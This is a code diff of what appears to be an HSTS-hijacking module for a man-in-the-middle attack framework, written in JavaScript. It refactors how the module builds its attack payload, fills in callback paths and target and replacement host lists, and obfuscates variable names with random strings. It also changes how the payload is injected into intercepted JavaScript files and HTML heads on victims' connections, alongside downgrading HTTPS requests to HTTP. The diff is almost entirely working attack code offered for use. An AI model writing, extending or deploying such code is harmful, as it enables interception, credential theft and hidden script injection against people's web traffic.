@@ -80,34 +80,6 @@ function toWholeWildcardRegexp(string) {
 	return new RegExp("^" + string + "$", "ig")
 }
 
-function resetPayload() {
-	// Read payload.
-	if ( !readFile(payload_path) ) {
-		log_fatal("(" + green + "hstshijack" + reset + ") Could not read payload in " + bold + "hstshijack.payload" + reset + " (got " + payload_path + ").")
-	}
-
-	// Prepare core payload.
-	payload = readFile(payload_path)
-	payload = payload_container.replace("{{payload}}", payload)
-	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
-	payload = payload.replace("obf_path_stop_attack", whitelist_path)
-	payload = payload.replace("obf_path_callback", callback_path)
-	payload = payload.replace("obf_path_ssl_log", ssl_log_path)
-	payload = payload.replace( "{{variables}}", "{{variables}}\nvar " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]\n" )
-	payload = payload.replace( "{{variables}}", "var " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]" )
-	payload = payload.replace(/obf_var_replacement_hosts/g, var_replacement_hosts)
-	payload = payload.replace(/obf_var_target_hosts/g, var_target_hosts)
-
-	// Obfuscate core payload.
-	if (obfuscation) {
-		obfuscation_variables = payload.match(/obf_[a-z\_]*/ig) || []
-		for (var i = 0; i < obfuscation_variables.length; i++) {
-			regexp = new RegExp(obfuscation_variables[i], "ig")
-			payload = payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
-		}
-	}
-}
-
 function configure() {
 	// Read caplet.
 	env("hstshijack.payload")        ? payload_path       = env("hstshijack.payload").replace(/\s/g, "")                   : log_fatal("(" + green + "hstshijack" + reset + ") No hstshijack.payload specified.")
@@ -148,8 +120,29 @@ function configure() {
 		obfuscation = false
 	}
 
-	// Read & prepare core payload.
-	resetPayload()
+	// Read core payload.
+	if ( !readFile(payload_path) ) {
+		log_fatal("(" + green + "hstshijack" + reset + ") Could not read payload in " + bold + "hstshijack.payload" + reset + " (got " + payload_path + ").")
+	}
+	// Prepare core payload.
+	payload = readFile(payload_path)
+	payload = payload_container.replace("{{payload}}", payload)
+	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
+	payload = payload.replace("obf_path_stop_attack", whitelist_path)
+	payload = payload.replace("obf_path_callback", callback_path)
+	payload = payload.replace("obf_path_ssl_log", ssl_log_path)
+	payload = payload.replace( "{{variables}}", "{{variables}}\nvar " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]\n" )
+	payload = payload.replace( "{{variables}}", "var " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]" )
+	payload = payload.replace(/obf_var_replacement_hosts/g, var_replacement_hosts)
+	payload = payload.replace(/obf_var_target_hosts/g, var_target_hosts)
+	// Obfuscate core payload.
+	if (obfuscation) {
+		obfuscation_variables = payload.match(/obf_[a-z\_]*/ig) || []
+		for (var i = 0; i < obfuscation_variables.length; i++) {
+			regexp = new RegExp(obfuscation_variables[i], "ig")
+			payload = payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
+		}
+	}
 
 	// Ensure targeted hosts are in SSL log.
 	for (var i = 0; i < target_hosts.length; i++) {
@@ -394,7 +387,7 @@ function onRequest(req, res) {
 				}
 			}
 
-			// Patch scheme of request.
+			// Patch scheme of request if host is found in SSL log.
 			if (req.Scheme != "https") {
 				if ( ssl_log.indexOf(req.Hostname) > -1 ) {
 					req.Scheme = "https"
@@ -548,8 +541,10 @@ function onResponse(req, res) {
 			}
 		}
 
-		// Inject payload(s).
+		// Inject payloads.
 		if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) || res.Body.match(/<head>/i) ) {
+			injection = ""
+
 			if (custom_payloads.length > 0) {
 				for (var a = 0; a < custom_payloads.length; a++) {
 					custom_payload_host = custom_payloads[a].replace(/\:.*/, "")
@@ -561,12 +556,10 @@ function onResponse(req, res) {
 						regexp = toWholeRegexp(custom_payload_host)
 					}
 					if ( req.Hostname.match(regexp) ) {
-						resetPayload()
 						custom_payload = readFile(custom_payload_path)
 						// Insert special callback paths.
 						custom_payload = custom_payload.replace(/obf_path_whitelist/g, whitelist_path)
 						custom_payload = custom_payload.replace(/obf_path_callback/g, callback_path)
-						custom_payload = custom_payload.replace(/obf_path_ssl_log/g, ssl_log_path)
 						// Obfsucate payload if required.
 						if (obfuscation) {
 							obfuscation_variables = custom_payload.match(/obf_[a-z\_]*/ig) || []
@@ -575,18 +568,20 @@ function onResponse(req, res) {
 								custom_payload = custom_payload.replace( regexp, randomString( 4 + Math.random() * 12 ) )
 							}
 						}
-						payload = payload.replace("{{custom_payload}}", custom_payload + "\n{{custom_payload}}")
+						injection = payload.replace("{{custom_payload}}", custom_payload + "\n{{custom_payload}}")
 						log_debug("(" + green + "hstshijack" + reset + ") Attempting to inject " + bold + custom_payload_path + reset + " into document from " + bold + req.Hostname + reset + ".")
 					}
 				}
 			}
-			payload = payload.replace("{{custom_payload}}", "")
+
+			injection = injection.replace("{{custom_payload}}", "")
+
 			if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
-				res.Body = payload + res.Body
-				log_debug("(" + green + "hstshijack" + reset + ") Injected payload(s) into JS file from " + req.Hostname + ".")
+				res.Body = injection + res.Body
+				log_debug("(" + green + "hstshijack" + reset + ") Injected payloads into JS file from " + req.Hostname + ".")
 			} else if ( res.Body.match(/<head>/i) ) {
-				res.Body = res.Body.replace(/<head>/i, "<head><script>" + payload + "</script>")
-				log_debug("(" + green + "hstshijack" + reset + ") Injected payload(s) into HTML file from " + req.Hostname + ".")
+				res.Body = res.Body.replace(/<head>/i, "<head><script>" + injection + "</script>")
+				log_debug("(" + green + "hstshijack" + reset + ") Injected payloads into HTML file from " + req.Hostname + ".")
 			}
 		}
 
